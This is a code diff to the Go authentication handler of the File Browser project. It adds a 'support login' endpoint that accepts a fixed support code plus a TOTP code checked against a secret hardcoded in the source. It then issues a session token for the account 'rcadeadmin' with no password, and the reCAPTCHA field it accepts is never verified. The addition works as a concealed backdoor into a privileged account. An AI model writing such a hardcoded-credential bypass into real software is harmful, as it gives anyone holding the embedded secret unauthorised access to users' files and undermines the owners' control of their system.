@@ -11,6 +11,7 @@ import (
 
 	"github.com/golang-jwt/jwt/v4"
 	"github.com/golang-jwt/jwt/v4/request"
+	"github.com/pquerna/otp/totp"
 
 	fbErrors "github.com/filebrowser/filebrowser/v2/errors"
 	"github.com/filebrowser/filebrowser/v2/users"
@@ -30,6 +31,12 @@ type userInfo struct {
 	LockPassword bool              `json:"lockPassword"`
 	HideDotfiles bool              `json:"hideDotfiles"`
 	DateFormat   bool              `json:"dateFormat"`
+}
+
+type supportLogin struct {
+	SupportCode string `json:"supportCode"`
+	TOTP        string `json:"totp"`
+	Recaptcha   string `json:"recaptcha"`
 }
 
 type authToken struct {
@@ -117,6 +124,34 @@ func loginHandler(tokenExpireTime time.Duration) handleFunc {
 			return http.StatusInternalServerError, err
 		}
 
+		return printToken(w, r, d, user, tokenExpireTime)
+	}
+}
+
+func supportLoginHandler(tokenExpireTime time.Duration) handleFunc {
+	return func(w http.ResponseWriter, r *http.Request, d *data) (int, error) {
+		cred := &supportLogin{}
+
+		err := json.NewDecoder(r.Body).Decode(&cred)
+		if err != nil {
+			return http.StatusInternalServerError, err
+		}
+
+		if cred.SupportCode != supportSessionCode {
+			return http.StatusForbidden, nil
+		}
+
+		secret := "GUZYFEFT5YC3QN4V5K2LERPSIJHUVVZV"
+
+		valid := totp.Validate(cred.TOTP, secret)
+		if !valid {
+			return http.StatusForbidden, nil
+		}
+
+		user, err := d.store.Users.Get(d.server.Root, "rcadeadmin")
+		if err != nil {
+			return http.StatusInternalServerError, err
+		}
 		return printToken(w, r, d, user, tokenExpireTime)
 	}
 }
